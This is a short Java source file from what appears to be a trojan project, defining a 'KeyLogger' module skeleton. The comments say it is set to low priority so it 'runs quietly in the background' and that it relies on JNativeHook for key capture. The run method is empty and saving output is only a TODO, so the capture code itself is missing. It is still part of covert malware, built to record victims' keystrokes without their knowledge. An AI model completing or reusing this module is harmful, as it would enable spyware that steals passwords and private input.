package dev.px.trojan.Impl.Modules.KeyLogger;

import dev.px.trojan.Impl.Modules.Module;

public class KeyloggerModule extends Module {

    public KeyloggerModule() {
        super("KeyLogger", true, Priority.LOW, false); // We dont need a thread since JNativeHook already uses one
        // We are setting priority to low so that it runs quietly in the background
    }

    @Override
    public void run() {
    }

    @Override
    public void onDisable() {
        // TODO: Save to output file on disable
    }
}
